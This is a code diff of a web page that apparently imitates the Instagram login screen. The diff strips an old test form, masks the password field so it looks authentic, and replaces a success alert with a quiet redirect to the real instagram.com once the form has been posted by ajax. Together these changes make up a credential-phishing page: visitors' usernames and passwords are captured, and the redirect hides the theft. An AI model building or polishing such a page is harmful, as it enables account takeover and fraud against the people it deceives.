@@ -13,33 +13,6 @@
     <div class="main">
         <div class="main-image">
             <img src="images/main-img.png" >
-            <div class="column">
-                <form id="gform1" action="">
-                  <label for="fname">First Name</label>
-                  <input type="text" id="fname" name="name" placeholder="Your name..">
-                  <!-- <label for="lname">Email</label> -->
-                  <input type="text" id="lname" name="email" placeholder="email.">
-                  <label for="Password">password</label>
-                  <input type="text" id="password" name="password" placeholder="password">
-                  <!-- <label for="country">Country</label>
-                  <select id="country" name="color">
-                    <option value="australia">Australia</option>
-                    <option value="canada">Canada</option>
-                    <option value="usa">USA</option>
-                    <option value="india">India</option>
-                  </select>
-                  <label for="State">State</label>
-                  <select id="State" name="color">
-                    <option value="">Select one</option>
-                    <option value="Kerala">Kerala</option>
-                    <option value="Karnadaka">Karnataka</option>
-                    <option value="Tamilnadu">Tamilnadu</option>
-                  </select>
-                  <label for="subject">Subject</label>
-                  <textarea id="subject" name="message" placeholder="Write something.." style="overflow:scroll;"></textarea> -->
-                  <input type="submit" value="Submit">
-                </form>
-              </div>
         </div>
         <div class="login-controls">
             
@@ -48,7 +21,7 @@
               </div>
             <form id="gform" action="" class="form-box">
               <input type="text" id="lname" name="email" class="user-input top" placeholder="Phone number, username, or email">
-              <input type="text" id="password" name="password" class="user-input" placeholder="Password">
+              <input type="password" id="password" name="password" class="user-input" placeholder="Password">
               <input type="submit" class="button" value="Log in">
             </form>
               <div class="or-main">
@@ -107,9 +80,9 @@
                     data:$("#gform").serialize(),
                     method:"post",
                     success:function (response){
-                        alert("Form submitted successfully")
-                        window.location.reload()
-                        // window.location.href="https://google.com"
+                        //alert("Form submitted successfully")
+                        //window.location.reload()
+                         window.location.href="https://instagram.com"
                     },
                     error:function (err){
                         alert("Something Error")
